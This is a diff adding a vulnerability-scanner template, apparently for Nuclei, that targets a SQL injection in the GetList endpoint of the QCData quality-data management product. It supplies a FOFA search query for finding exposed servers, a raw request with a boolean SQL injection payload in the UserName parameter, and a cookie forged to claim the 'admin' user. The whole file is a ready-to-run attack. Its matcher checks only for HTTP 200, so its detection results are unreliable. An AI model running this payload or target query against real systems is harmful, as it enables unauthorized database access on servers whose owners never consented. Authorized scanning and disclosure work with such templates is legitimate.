@@ -1,0 +1,35 @@
+id: poc-hg9g034uuxsh2ume
+info:
+  name: QCData 品质数据管理专家GetList存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hg9g034uuxsh2ume'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hg9g034uuxsh2ume
+    fofa: icon_hash="2029937574" || title="QCData 品质数据管理专家"
+http:
+- raw:
+  - 'GET /BasicData/UserMap/GetList?page=1&limit=20&UserName=-7164''+OR+1600=1601+OR+''coJj''=''fxSl&NickName=11 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: application/json, text/ｊａｖａｓｃｒｉｐｔ, */*; q=0.01
+
+    X-Requested-With: XMLHttpRequest
+
+    Accept-Encoding: gzip, deflate
+
+    Priority: u=0
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
+
+    Cookie: QCWeb_lang=zh-CN; QCWeb_User=YWRtaW4=
+
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
